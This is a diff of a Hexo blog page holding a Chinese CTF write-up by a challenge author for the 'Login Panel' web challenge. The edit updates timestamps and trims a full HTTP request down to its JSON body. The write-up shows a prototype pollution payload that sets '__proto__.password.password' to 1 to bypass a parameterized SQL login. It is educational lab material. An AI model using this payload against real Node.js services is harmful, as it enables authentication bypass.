@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="前言我這次出兩題，分別是  Web Login Panel   Misc  png chunk     Login Panel預期解是 sql injection + prototype pollution sql injection1SELECT ? AS SECRET FROM users WHERE user &#x3D; ? AND password &#x3D; ? -&gt; 1SELECT ? AS S">
+        <meta name="description" content="前言我這次出兩題，分別是  Web Login Panel   Misc  png chunk     Login Panel預期解是 prototype pollution sql injection1SELECT ? AS SECRET FROM users WHERE user &#x3D; ? AND password &#x3D; ? -&gt; 1SELECT ? AS SECRET FROM users">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2024 THJCC WINTER writeup">
 <meta property="og:url" content="http://example.com/2024/12/16/2024-THJCC-WINTER-writeup/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前言我這次出兩題，分別是  Web Login Panel   Misc  png chunk     Login Panel預期解是 sql injection + prototype pollution sql injection1SELECT ? AS SECRET FROM users WHERE user &#x3D; ? AND password &#x3D; ? -&gt; 1SELECT ? AS S">
+<meta property="og:description" content="前言我這次出兩題，分別是  Web Login Panel   Misc  png chunk     Login Panel預期解是 prototype pollution sql injection1SELECT ? AS SECRET FROM users WHERE user &#x3D; ? AND password &#x3D; ? -&gt; 1SELECT ? AS SECRET FROM users">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackmd.io/_uploads/rkAO9L6Vye.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HkXLiUTV1e.png">
@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://hackmd.io/_uploads/ByjmR86N1g.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/ry6uR8aEke.png">
 <meta property="article:published_time" content="2024-12-16T07:52:19.000Z">
-<meta property="article:modified_time" content="2024-12-16T08:02:17.393Z">
+<meta property="article:modified_time" content="2024-12-16T10:28:24.709Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -613,8 +613,8 @@ mjx-container[display="true"] + br {
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-16 16:02:17</span>
-            <span class="mobile">2024-12-16 16:02:17</span>
+            <span class="desktop">2024-12-16 18:28:24</span>
+            <span class="mobile">2024-12-16 18:28:24</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -660,7 +660,7 @@ mjx-container[display="true"] + br {
 </li>
 </ul>
 <hr>
-<h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><p>預期解是 sql injection + prototype pollution</p>
+<h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><p>預期解是 prototype pollution</p>
 <h3 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ? <span class="keyword">AS</span> SECRET <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> ? <span class="keyword">AND</span> password <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure></div>
 <p>-&gt;</p>
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ? <span class="keyword">AS</span> SECRET <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">'admin'</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">'1'</span></span><br></pre></td></tr></table></figure></div>
@@ -673,7 +673,7 @@ mjx-container[display="true"] + br {
 
 <p>可以加入<code>__proto__</code> </p>
 <p>只要我</p>
-<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /auth HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> cha-thjcc.scint.org<span class="punctuation">:</span><span class="number">10022</span></span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">120</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">125.0</span><span class="number">.6422</span><span class="number">.60</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://cha-thjcc.scint.org:10022</span></span><br><span class="line"><span class="comment">Referer: http://cha-thjcc.scint.org:10022/login</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">    "user": "admin",</span></span><br><span class="line"><span class="comment">      "__proto__": {</span></span><br><span class="line"><span class="comment">        "password": {</span></span><br><span class="line"><span class="comment">          "password": 1</span></span><br><span class="line"><span class="comment">        }</span></span><br><span class="line"><span class="comment">      }</span></span><br><span class="line"><span class="comment">    }</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"user"</span><span class="punctuation">:</span> <span class="string">"admin"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"__proto__"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"password"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"password"</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span></span><br></pre></td></tr></table></figure></div>
 
 <p>加入 <code>__proto__</code> 的，整個 <code>Object.prototype.password.password</code> 被設為 1</p>
 <p>那<img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAO9L6Vye.png" alt="截圖 2024-12-16 15.44.42"></p>
@@ -699,7 +699,7 @@ mjx-container[display="true"] + br {
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-12-16 16:02:17
+                    :</strong> 2024-12-16 18:28:24
             </li>
         
         <li>
